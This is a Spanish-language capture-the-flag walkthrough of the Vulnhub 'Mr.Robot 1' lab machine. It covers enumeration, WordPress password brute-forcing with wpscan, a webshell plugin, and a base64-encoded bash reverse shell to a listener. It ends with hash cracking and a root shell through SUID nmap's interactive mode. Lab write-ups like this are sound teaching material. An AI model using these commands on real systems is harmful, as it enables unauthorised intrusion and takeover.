---
title: Mr.Robot 1 - Vulnhub
layout: page
permalink: /writeups/vulnhub/mrrobot1
date: 2025-04-01 11:00:00 -0000
categories: [Laboratorios]
tags: [Vulnhub, Mr.Robot]
description: >
  Write up en español para Mr.Robot 1 - Vulnhub
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Contexto

Basada en la serie Mr. Robot, esta máquina contiene tres llaves ocultas en distintas ubicaciones. El objetivo es encontrar las tres. 
Cada llave es progresivamente más difícil de conseguir aunque no es una máquina demasiado complicada, no requiere explotación avanzada ni ingeniería inversa. 

Está catalogada como nivel principiante-intermedio.

## Escaneo de puertos

```bash
❯ nmap -sS -Pn -T4 -O 192.168.100.90
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 11:18 CEST
Nmap scan report for 192.168.100.90
Host is up (0.00029s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: BC:24:11:A4:17:95 (Proxmox Server Solutions GmbH)
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.14 (94%), Amazon Fire TV (93%), Linux 3.2 - 3.8 (93%), Linux 3.13 - 4.4 (93%), Linux 3.18 (93%), Linux 3.13 or 4.2 (92%), Linux 4.4 (92%), Synology DiskStation Manager 7.1 (Linux 4.4) (92%), Linux 2.6.32 - 3.13 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
```

Observamos tres puertos abiertos:

- 22/tcp: SSH
- 80/tcp: HTTP
- 443/tcp: HTTPS

Para seguir investigando procedemos a visitar el sitio web de la máquina.

## Visitando el sitio web

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image.png)

Tras una animación que simula el inicio de una máquina nos da un mensaje que parece escrito por el protagonista de la serie Elliot.

El mensaje dice:

    11:16 <mr. robot>
    Hola, amigo. Si has venido, has venido por una razón. Puede que aún no seas capaz de explicarlo, pero hay una parte de ti que está agotada de este mundo... un mundo que decide dónde trabajas, a quién ves y cómo vacías y llenas tu deprimente cuenta bancaria. Incluso la conexión a Internet que estás usando para leer esto te está costando, desgastándote lentamente. Hay cosas que quieres decir. Pronto te daré una voz. Hoy comienza tu educación.

Luego nos muestra una serie de comandos que nos dejan interactuar con la máquina.

- prepare: Nos muestra un video relacionado con la serie.

- fsociety: Nos muestra un video relacionado con la serie.

- inform: Nos muestra una serie de noticias comentadas por Mr. Robot sobre el mundo.

- question: Nos muestra una serie de imágenes reivindicativas sobre la sociedad.

- wakeup: Nos muestra otro video relacionado con la serie.

- join: Este comando nos muestra lo siguiente: 

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-1.png)

Parece que tendremos que responder un email, si lo introducimos tras unos segundos muestra un mensaje diciendo que "estaremos en contacto".

Por este camino parece que no tenemos mucho más.

## Explorando directorios web

```bash
❯ gobuster dir -u http://192.168.100.90 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.90
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://192.168.100.90/0/]
/Image                (Status: 301) [Size: 0] [--> http://192.168.100.90/Image/]
/admin                (Status: 301) [Size: 236] [--> http://192.168.100.90/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://192.168.100.90/feed/atom/]
/audio                (Status: 301) [Size: 236] [--> http://192.168.100.90/audio/]
/blog                 (Status: 301) [Size: 235] [--> http://192.168.100.90/blog/]
/css                  (Status: 301) [Size: 234] [--> http://192.168.100.90/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://192.168.100.90/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://192.168.100.90/feed/]
/images               (Status: 301) [Size: 237] [--> http://192.168.100.90/images/]
/image                (Status: 301) [Size: 0] [--> http://192.168.100.90/image/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.100.90/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 233] [--> http://192.168.100.90/js/]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://192.168.100.90/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://192.168.100.90/]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rdf                  (Status: 301) [Size: 0] [--> http://192.168.100.90/feed/rdf/]
/render/https://www.google.com (Status: 301) [Size: 0] [--> http://192.168.100.90/render/https:/www.google.com]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://192.168.100.90/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://192.168.100.90/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 236] [--> http://192.168.100.90/video/]
/wp-admin             (Status: 301) [Size: 239] [--> http://192.168.100.90/wp-admin/]
/wp-content           (Status: 301) [Size: 241] [--> http://192.168.100.90/wp-content/]
/wp-includes          (Status: 301) [Size: 242] [--> http://192.168.100.90/wp-includes/]
/wp-cron              (Status: 200) [Size: 0]
/wp-config            (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-load              (Status: 200) [Size: 0]
/wp-login             (Status: 200) [Size: 2678]
/wp-mail              (Status: 500) [Size: 3025]
/wp-settings          (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> http://192.168.100.90/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc               (Status: 405) [Size: 42]
Progress: 4744 / 4745 (99.98%)
===============================================================
Finished
===============================================================
```

Vemos cosas interesantes como que se trata de un sitio web de Wordpress y que tenemos direcorios de archivos como `wp-admin` y `wp-content`.

Por ejemplo podemos visitar el archivo `robots.txt` para ver que es un archivo de texto plano que contiene una serie de palabras que nos indican a los bots que deben ignorar nuestro sitio web.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-2.png)

### Primera llave

La primera llave se encuentra en ese archhivo `key-1-of-3.txt`.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-3.png)

El otro archivo que encontramos es fsociety.dic que se trata de un diccionario con 858,160 palabras, lo vamos a guardar por si hiciese falta; `curl http://192.168.100.90/fsocity.dic > fsocity.dic`.

## Login Wordpress

En el panel de loin wordpress encontramos algo útil para probar y es que nos permite verificar si el usuario es correcto independientemente de la contraseña.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-4.png)

Sabiendo esto podemos usar el diccionario que hemos encontrado para intentar lograr acceso a la máquina.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-5.png)

Encontramos varios usuarios, ahora podemos hacer lo mismo para la contraseña ya que si probamos estos usuarios veremos que el mensaje cambia.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-6.png)

Para hacer fuerza bruta sobre el login vamos a usar una herramienta diseñada concretamente para Worpress llamada `wpscan` ya que hydra nos podría dar falsos positivos.

```bash
❯ wpscan -U XXXXXX -P ./fsocity.dic --url http://192.168.100.90
```
![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-15.png)

## Subiendo plugins maliciosos

Una vez dentro encontramos que somos administradores del wordpress por lo que tenemos acceso a manejar los plugins y modifica o crear nuevos.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-7.png)

Vamos a agregar un plugin para otener una shell reversa.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-8.png)

[Shell utilizada](https://github.com/p0dalirius/Wordpress-webshell-plugin)

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-9.png)

Ahora podemos ejecutar comando mediante curl o desde el navegador.


## Web shell

```bash
❯ curl -X POST '192.168.100.92/wp-content/plugins/wp_webshell/wp_webshell.php' --data "action=exec&cmd=id"
{"stdout":"uid=1(daemon) gid=1(daemon) groups=1(daemon)\n","stderr":"","exec":"id"}% 
```

Aprovechando esto podemos exfiltrar información de la máquina o crear una shell inversa.

### Shell reversa

Usamos el siguiente comando para ejecutar la revshell codificada en base64.

```bash
curl -X POST '192.168.100.92/wp-content/plugins/wp_webshell/wp_webshell.php' --data "action=exec&cmd=echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTAwLjIxMC80NDQ0IDA%2BJjE= | base64 -d | bash"
# y en otro terminal escuchamos el puerto 4444
nc -nlvp 4444
```

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-10.png)

Estabilizamos la shell y la hacemos interactiva.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-11.png)

El usuario que manejamos no tiene muchos permisos a simple vista pero si echamos un vistazo a los directorios de otros usuarios encontramos que existe uno llamado `robot` que contiene la seguna key y un hash md5. 
La key no tenemos permiso para leerla pero el hash si por lo que simplemente vamos a crackearlo.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-12.png)

Copiamos el hash tal cual y lo vamos a crackear con hashcat.

```bash
hashcat -m 0 -a 0 --user hash.txt /usr/share/wordlists/rockyou.txt
```

Indicamos con `--user`que el hash tiene el nombre del usuario antes del propio hash y con `-m 0` que es de tipo MD5.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-13.png)

Como no diponemos de ssh tendremos que escalar dentro de la shell que ya teníamos.

### Segunda llave

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-14.png)

## Escalando privilegios

Este usuario no tiene privilegios para realizar ninguna acción como sudo en principio por lo que el comando `sudo -l` nos muestra que no tiene ninguna opción.

Aun así podemos buscar que binario tienen activo el SUID que nos puedan ser útiles.

```bash
find / -perm -4000 -type f 2>/dev/null
```

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-16.png)

Tras un rato explorando los binario podemos ver que uno de ellos es nmap concretamente la versión 3.81.

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-17.png)

Buscando por internet posibles vulnerabilidades relacionadas encontramos que estas versiones de Nmap contaban un un modo interactivo que nos permite interactuar con la máquina.

[Articulo sobre el modo interactivo](https://medium.com/@abinreji8/interactive-mode-vulnerability-in-nmap-3-81-971ddfd1b27a)

Finalmente usamos 

```bash
nmap --interactive
# una vez dentro del modo interactivo
!sh
```

![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-18.png)

